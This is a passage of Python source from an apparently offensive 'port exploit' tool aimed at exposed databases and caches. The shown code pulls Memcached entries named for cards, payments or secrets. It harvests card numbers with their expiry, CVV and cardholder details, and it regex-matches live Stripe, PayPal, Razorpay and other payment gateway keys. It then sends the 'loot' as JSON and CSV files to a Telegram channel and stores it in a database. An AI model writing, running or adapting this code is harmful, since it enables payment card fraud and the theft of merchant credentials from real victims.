                                "card", "payment", "session", "token",
                                "auth", "user", "stripe", "order", "billing",
                                "gateway", "secret", "api", "cart",
                            ]):
                                try:
                                    writer.write(f"get {key}\r\n".encode())
                                    await writer.drain()
                                    val_data = await self._read_until_end(
                                        reader, b"END\r\n", timeout=3
                                    )
                                    val_str = val_data.decode(
                                        "utf-8", errors="replace"
                                    )
                                    if val_str.strip() and val_str.strip() != "END":
                                        result.redis_data[key] = val_str[:5000]
                                        result.rows_dumped += 1
                                        self._check_string_for_cards(
                                            val_str, key, result
                                        )
                                        self._check_string_for_keys(
                                            val_str, key, result
                                        )
                                except Exception:
                                    pass
                except Exception as e:
                    logger.debug(f"[PortExploit] Memcached slab {slab_id}: {e}")

            result.success = bool(
                result.memcached_items or result.rows_dumped
            )
            self.stats["memcached_looted"] += 1

        except Exception as e:
            result.errors.append(str(e))
        finally:
            if writer:
                try:
                    writer.write(b"quit\r\n")
                    await writer.drain()
                    writer.close()
                except Exception:
                    pass

        return result

    async def _read_until_end(
        self,
        reader: asyncio.StreamReader,
        end_marker: bytes,
        timeout: float = 5,
    ) -> bytes:
        """Read from stream until end marker or timeout."""
        buf = b""
        try:
            while True:
                chunk = await asyncio.wait_for(
                    reader.read(4096), timeout=timeout
                )
                if not chunk:
                    break
                buf += chunk
                if end_marker in buf:
                    break
                if len(buf) > 65536:
                    break
        except asyncio.TimeoutError:
            pass
        return buf

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   CARD / KEY DETECTION HELPERS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    def _check_row_for_cards(self, row: Dict, result: ExploitResult):
        """Check a row dict for card-like data."""
        for col, val in row.items():
            val_str = str(val).strip()
            if not val_str or val_str.lower() in ("none", "null", ""):
                continue
            if _looks_like_card(val_str):
                card_entry = {
                    "card_number": val_str,
                    "source_column": col,
                    "source": f"{result.service}:{result.ip}:{result.port}",
                }
                # Try to find expiry/cvv in same row
                for k, v in row.items():
                    kl = k.lower()
                    vs = str(v).strip()
                    if any(x in kl for x in ["exp", "valid", "mm_yy"]):
                        card_entry["expiry"] = vs
                    elif any(x in kl for x in ["cvv", "cvc", "security_code", "ccv"]):
                        card_entry["cvv"] = vs
                    elif any(x in kl for x in ["holder", "name_on_card", "cardholder"]):
                        card_entry["cardholder"] = vs
                result.cards_found.append(card_entry)

    def _check_row_for_keys(self, row: Dict, result: ExploitResult):
        """Check a row dict for gateway API keys."""
        gateway_patterns = [
            (r"sk_live_\w{20,}", "stripe_secret"),
            (r"pk_live_\w{20,}", "stripe_publishable"),
            (r"sk_test_\w{20,}", "stripe_test_secret"),
            (r"rk_live_\w{20,}", "stripe_restricted"),
            (r"whsec_\w{20,}", "stripe_webhook"),
            (r"A[A-Za-z0-9]{15,}\.SANDBOX", "paypal_sandbox"),
            (r"A[A-Za-z0-9]{15,}\.LIVE", "paypal_live"),
            (r"FLWSECK-\w{20,}", "flutterwave_secret"),
            (r"FLWPUBK-\w{20,}", "flutterwave_public"),
            (r"rzp_live_\w{10,}", "razorpay_live"),
            (r"rzp_test_\w{10,}", "razorpay_test"),
            (r"sq0[a-z]{3}-\w{20,}", "square"),
        ]

        for col, val in row.items():
            val_str = str(val).strip()
            if not val_str or len(val_str) < 10:
                continue
            # Direct column name match
            col_l = col.lower()
            if any(kw in col_l for kw in [
                "api_key", "secret_key", "private_key", "stripe",
                "paypal", "braintree", "publishable", "merchant",
                "gateway", "access_token", "client_secret",
            ]):
                result.gateway_keys.append({
                    "key_type": col,
                    "key_value": val_str,
                    "source": f"{result.service}:{result.ip}:{result.port}",
                })
            # Regex match in values
            for pattern, key_type in gateway_patterns:
                if re.search(pattern, val_str):
                    result.gateway_keys.append({
                        "key_type": key_type,
                        "key_value": val_str,
                        "source": f"{result.service}:{result.ip}:{result.port}",
                    })

    def _check_string_for_cards(
        self, text: str, key_name: str, result: ExploitResult
    ):
        """Check a string value (Redis/Memcached) for card numbers."""
        # Look for card-like numbers
        numbers = re.findall(r"\b[3-6]\d{12,18}\b", text)
        for num in numbers:
            clean = re.sub(r"[\s\-]", "", num)
            if _luhn(clean):
                result.cards_found.append({
                    "card_number": clean,
                    "source_key": key_name,
                    "source": f"{result.service}:{result.ip}:{result.port}",
                })

    def _check_string_for_keys(
        self, text: str, key_name: str, result: ExploitResult
    ):
        """Check a string value for gateway API keys."""
        patterns = [
            (r"sk_live_\w{20,}", "stripe_secret"),
            (r"pk_live_\w{20,}", "stripe_publishable"),
            (r"sk_test_\w{20,}", "stripe_test_secret"),
            (r"whsec_\w{20,}", "stripe_webhook"),
            (r"rzp_live_\w{10,}", "razorpay_live"),
            (r"FLWSECK-\w{20,}", "flutterwave_secret"),
            (r"sq0[a-z]{3}-\w{20,}", "square"),
        ]
        for pattern, key_type in patterns:
            matches = re.findall(pattern, text)
            for m in matches:
                result.gateway_keys.append({
                    "key_type": key_type,
                    "key_value": m,
                    "source_key": key_name,
                    "source": f"{result.service}:{result.ip}:{result.port}",
                })

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   REPORTING & PERSISTENCE
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _report_loot(self, report: FullExploitReport):
        """Send Telegram report of exploitation results."""
        if not self.reporter:
            return

        lines = [
            f"ğŸ”“ <b>PORT EXPLOIT â€” {report.domain}</b>",
            "",
        ]

        for r in report.results:
            emoji = {
                "MySQL": "ğŸ¬", "PostgreSQL": "ğŸ˜", "MongoDB": "ğŸƒ",
                "Redis": "ğŸ”´", "Elasticsearch": "ğŸ”", "Memcached": "âš¡",
            }.get(r.service, "ğŸ”Œ")

            lines.append(
                f"{emoji} <b>{r.service}</b> ({r.ip}:{r.port})"
            )
            lines.append(f"  Auth: <code>{r.creds_used}</code>")

            if r.databases_found:
                lines.append(
                    f"  DBs: {len(r.databases_found)} â€” "
                    f"{', '.join(r.databases_found[:5])}"
                )
            if r.card_tables:
                lines.append(
                    f"  ğŸ’³ Card tables: {', '.join(r.card_tables[:5])}"
                )
            if r.rows_dumped:
                lines.append(f"  Rows: <b>{r.rows_dumped}</b>")
            if r.cards_found:
                lines.append(
                    f"  ğŸ’³ <b>CARDS FOUND: {len(r.cards_found)}</b>"
                )
            if r.gateway_keys:
                lines.append(
                    f"  ğŸ”‘ <b>GATEWAY KEYS: {len(r.gateway_keys)}</b>"
                )
            if r.redis_keys:
                lines.append(f"  Keys: {len(r.redis_keys)}")
            if r.es_indices:
                lines.append(f"  Indices: {len(r.es_indices)}")
            if r.memcached_items:
                lines.append(f"  Items: {len(r.memcached_items)}")
            lines.append("")

        if report.alt_http_ports:
            lines.append(
                f"ğŸ”„ <b>Alt-HTTP ports (WAF bypass):</b> "
                f"{', '.join(str(p) for p in report.alt_http_ports)}"
            )

        # Summary
        if report.total_cards or report.total_keys:
            lines.append("")
            lines.append(
                f"ğŸ“Š <b>Total:</b> {report.total_cards} cards, "
                f"{report.total_keys} keys, {report.total_rows} rows"
            )

        text = "\n".join(lines)

        try:
            await self.reporter.send_message(text)
        except Exception as e:
            logger.debug(f"[PortExploit] Telegram report error: {e}")

        # Send loot files if we have data
        if report.total_rows > 0:
            await self._send_loot_files(report)

    async def _send_loot_files(self, report: FullExploitReport):
        """Generate and send CSV / JSON loot files."""
        if not self.reporter:
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain_safe = re.sub(r"[^\w]", "_", report.domain)

        # Cards JSON
        if any(r.cards_found for r in report.results):
            all_cards = []
            for r in report.results:
                all_cards.extend(r.cards_found)
            if all_cards:
                cards_json = json.dumps(all_cards, indent=2)
                try:
                    await self.reporter._send_document(
                        cards_json.encode(),
                        f"{domain_safe}_{ts}_port_cards.json",
                        f"ğŸ’³ {len(all_cards)} cards from port exploit â€” {report.domain}",
                    )
                except Exception as e:
                    logger.debug(f"[PortExploit] Failed to send cards file: {e}")

        # Gateway keys JSON
        if any(r.gateway_keys for r in report.results):
            all_keys = []
            for r in report.results:
                all_keys.extend(r.gateway_keys)
            if all_keys:
                keys_json = json.dumps(all_keys, indent=2)
                try:
                    await self.reporter._send_document(
                        keys_json.encode(),
                        f"{domain_safe}_{ts}_port_keys.json",
                        f"ğŸ”‘ {len(all_keys)} gateway keys from port exploit â€” {report.domain}",
                    )
                except Exception as e:
                    logger.debug(f"[PortExploit] Failed to send keys file: {e}")

        # Full CSV of raw data
        all_raw = []
        for r in report.results:
            all_raw.extend(r.raw_data)
        if all_raw:
            buf = io.StringIO()
            all_cols = set()
            for row in all_raw:
                all_cols.update(row.keys())
            cols = sorted(all_cols)
            writer = csv.DictWriter(buf, fieldnames=cols, extrasaction="ignore")
            writer.writeheader()
            for row in all_raw:
                writer.writerow(row)
            csv_bytes = buf.getvalue().encode()
            try:
                await self.reporter._send_document(
                    csv_bytes,
                    f"{domain_safe}_{ts}_port_dump.csv",
                    f"ğŸ“„ {len(all_raw)} rows from port exploit â€” {report.domain}",
                )
            except Exception as e:
                logger.debug(f"[PortExploit] Failed to send CSV: {e}")

        # Redis data JSON
        redis_data = {}
        for r in report.results:
            if r.redis_data:
                redis_data.update(r.redis_data)
        if redis_data:
            redis_json = json.dumps(redis_data, indent=2, default=str)
            try:
                await self.reporter._send_document(
                    redis_json.encode(),
                    f"{domain_safe}_{ts}_redis_dump.json",
                    f"ğŸ”´ {len(redis_data)} Redis keys â€” {report.domain}",
                )
            except Exception as e:
                logger.debug(f"[PortExploit] Failed to send Redis file: {e}")

    async def _save_loot(self, report: FullExploitReport):
        """Persist findings to database."""
        if not self.db:
            return

        url = f"https://{report.domain}"

        for r in report.results:
            # Cards
            for card in r.cards_found:
                try:
                    self.db.add_card_data(url, card)
                except Exception:
                    pass
            # Gateway keys
            for key in r.gateway_keys:
                try:
                    self.db.add_gateway_key(
                        url=url,
                        key_type=key.get("key_type", ""),
                        key_value=key.get("key_value", ""),
                        source=f"port_exploit:{r.service}:{r.port}",
                        confidence=0.9,
                    )
                except Exception:
                    pass

    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    #   STATS
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    def get_stats_text(self) -> str:
        s = self.stats
        return (
            "ğŸ”“ <b>Port Exploiter Stats</b>\n"
            f"Exploits: <b>{s['total_exploits']}</b>\n"
            f"MySQL: <b>{s['mysql_looted']}</b> | "
            f"PostgreSQL: <b>{s['postgres_looted']}</b> | "
            f"Mongo: <b>{s['mongo_looted']}</b>\n"
            f"Redis: <b>{s['redis_looted']}</b> | "
            f"ES: <b>{s['es_looted']}</b> | "
            f"Memcached: <b>{s['memcached_looted']}</b>\n"
            f"Cards: <b>{s['total_cards']}</b> | "
            f"Keys: <b>{s['total_keys']}</b> | "
            f"Rows: <b>{s['total_rows']}</b>"
        )
